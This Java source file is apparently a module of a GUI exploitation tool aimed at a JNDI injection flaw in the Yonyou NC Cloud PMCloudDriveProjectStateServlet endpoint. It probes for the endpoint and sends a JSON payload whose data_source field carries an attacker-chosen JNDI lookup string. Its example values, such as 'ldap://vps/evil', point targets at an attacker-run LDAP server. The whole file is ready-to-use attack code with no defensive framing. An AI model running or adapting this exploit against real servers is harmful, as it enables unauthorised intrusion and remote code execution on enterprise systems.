package exp.oa.yongyou.ncc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_nc_cloud_PMCloudDriveProjectStateServlet_JNDI implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try{

            HashMap head = new HashMap<String, String>();
            Response response = HttpTools.get(url + "/service/~aert/PMCloudDriveProjectStateServlet", head, "utf-8");
            if (response.getCode() ==200 && response.getText().contains("responseCode") ) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_cloud_PMCloudDriveProjectStateServlet_JNDI ]");
                    textArea.appendText("\n 存在PMCloudDriveProjectStateServlet接口");
                });
                Platform.runLater(() -> {
                    textArea.appendText("\n eg1: ldap://dnslog.cn");
                    textArea.appendText("\n eg2: ldap://vps/evil\n");
                });
                return true;
            } else {
                Platform.runLater(() -> textArea.appendText("\n"));

                return false;
            }
        }catch (Exception e){
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        try{
            String data = "{\"data_source\":\""+cmd+"\",\"user\":\"admin\",\"pk_group\":\"111\"}";
            HashMap head = new HashMap<String, String>();
            head.put("Content-Type","application/x-www-form-urlencoded");
            Response response = HttpTools.post(url + "/service/~aert/PMCloudDriveProjectStateServlet",data, head, "utf-8");
            if (response.getCode() ==200 && response.getText().contains("responseCode")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行成功,请自行判断");
                    textArea_cmd.appendText("\n"+ cmd);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 执行失败！");
                });
                return false;
            }
        }catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });

        }
        return false;
    }
}
